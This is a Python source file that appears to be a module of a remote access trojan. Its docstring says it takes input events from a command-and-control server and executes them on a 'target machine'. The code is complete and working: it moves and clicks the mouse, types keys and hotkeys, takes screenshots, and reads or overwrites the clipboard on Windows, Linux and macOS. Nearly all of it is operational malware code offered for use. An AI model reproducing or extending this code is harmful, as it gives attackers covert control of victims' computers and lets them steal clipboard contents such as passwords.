"""
remote_control — keyboard and mouse control module.
Receives input events from the C2 and executes them on the target machine.

Actions:
    mouse_move      — move mouse to absolute (x, y)
    mouse_click     — click at (x, y) with button (left/right/middle)
    mouse_scroll    — scroll wheel at (x, y) by dy
    mouse_drag      — drag from (x1,y1) to (x2,y2)
    key_press       — press a key (e.g. "enter", "ctrl+c", "a")
    key_type        — type a string of text
    hotkey          — press a combination e.g. ["ctrl","alt","del"]
    screenshot      — capture single frame (delegates to screen_stream)
    clipboard_get   — read clipboard contents
    clipboard_set   — write text to clipboard
"""
import logging
import platform
import time

name = "remote_control"
version = "1.0.0"
os_compat = ["windows", "linux", "darwin"]
dependencies = ["pynput", "pyperclip"]

logger = logging.getLogger(__name__)


def _get_controller():
    from pynput.mouse import Button, Controller as MouseCtrl
    from pynput.keyboard import Key, Controller as KeyCtrl, HotKey
    return MouseCtrl(), KeyCtrl(), Button, Key, HotKey


def _resolve_key(key_str: str):
    """Map string to pynput Key enum or character."""
    from pynput.keyboard import Key
    special = {
        "enter": Key.enter, "return": Key.enter,
        "tab": Key.tab, "space": Key.space,
        "backspace": Key.backspace, "delete": Key.delete,
        "escape": Key.esc, "esc": Key.esc,
        "up": Key.up, "down": Key.down, "left": Key.left, "right": Key.right,
        "home": Key.home, "end": Key.end, "page_up": Key.page_up, "page_down": Key.page_down,
        "insert": Key.insert, "caps_lock": Key.caps_lock,
        "ctrl": Key.ctrl, "ctrl_l": Key.ctrl_l, "ctrl_r": Key.ctrl_r,
        "alt": Key.alt, "alt_l": Key.alt_l, "alt_r": Key.alt_r,
        "shift": Key.shift, "shift_l": Key.shift_l, "shift_r": Key.shift_r,
        "cmd": Key.cmd, "win": Key.cmd, "super": Key.cmd,
        "f1": Key.f1, "f2": Key.f2, "f3": Key.f3, "f4": Key.f4,
        "f5": Key.f5, "f6": Key.f6, "f7": Key.f7, "f8": Key.f8,
        "f9": Key.f9, "f10": Key.f10, "f11": Key.f11, "f12": Key.f12,
        "print_screen": Key.print_screen, "scroll_lock": Key.scroll_lock,
        "num_lock": Key.num_lock,
    }
    k = key_str.lower().strip()
    return special.get(k, key_str)


def run(
    action: str = "screenshot",
    x: int = 0,
    y: int = 0,
    x2: int = 0,
    y2: int = 0,
    button: str = "left",
    dy: int = 3,
    key: str = "",
    text: str = "",
    keys: list | None = None,
    **kwargs,
) -> dict:

    try:
        if action == "screenshot":
            from modules.screen_stream import run as ss_run
            return ss_run(action="frame")

        elif action == "mouse_move":
            mouse, _, _, _, _ = _get_controller()
            mouse.position = (x, y)
            return {"status": "completed", "data": {"x": x, "y": y}}

        elif action == "mouse_click":
            from pynput.mouse import Button
            mouse, _, btn_cls, _, _ = _get_controller()
            btn_map = {"left": Button.left, "right": Button.right, "middle": Button.middle}
            btn = btn_map.get(button.lower(), Button.left)
            mouse.position = (x, y)
            time.sleep(0.05)
            mouse.click(btn, 1)
            return {"status": "completed", "data": {"x": x, "y": y, "button": button}}

        elif action == "mouse_scroll":
            mouse, _, _, _, _ = _get_controller()
            mouse.position = (x, y)
            mouse.scroll(0, dy)
            return {"status": "completed", "data": {"dy": dy}}

        elif action == "mouse_drag":
            from pynput.mouse import Button
            mouse, _, _, _, _ = _get_controller()
            btn = Button.left
            mouse.position = (x, y)
            time.sleep(0.05)
            mouse.press(btn)
            time.sleep(0.05)
            mouse.position = (x2, y2)
            time.sleep(0.05)
            mouse.release(btn)
            return {"status": "completed", "data": {"from": [x, y], "to": [x2, y2]}}

        elif action == "key_press":
            _, kbd, _, _, _ = _get_controller()
            k = _resolve_key(key)
            kbd.press(k)
            time.sleep(0.05)
            kbd.release(k)
            return {"status": "completed", "data": {"key": key}}

        elif action == "key_type":
            _, kbd, _, _, _ = _get_controller()
            kbd.type(text)
            return {"status": "completed", "data": {"typed": len(text)}}

        elif action == "hotkey":
            if not keys:
                return {"status": "error", "data": {"message": "keys list required"}}
            from pynput.keyboard import Controller as KeyCtrl
            kbd = KeyCtrl()
            resolved = [_resolve_key(k) for k in keys]
            for k in resolved:
                kbd.press(k)
                time.sleep(0.02)
            time.sleep(0.05)
            for k in reversed(resolved):
                kbd.release(k)
                time.sleep(0.02)
            return {"status": "completed", "data": {"hotkey": keys}}

        elif action == "clipboard_get":
            import pyperclip
            content = pyperclip.paste()
            return {"status": "completed", "data": {"clipboard": content}}

        elif action == "clipboard_set":
            import pyperclip
            pyperclip.copy(text)
            return {"status": "completed", "data": {"set": True}}

        else:
            return {"status": "error", "data": {"message": f"unknown action: {action}"}}

    except ImportError as e:
        return {"status": "error", "data": {"message": f"missing dependency: {e}"}}
    except Exception as e:
        logger.exception("remote_control error")
        return {"status": "error", "data": {"message": str(e)}}
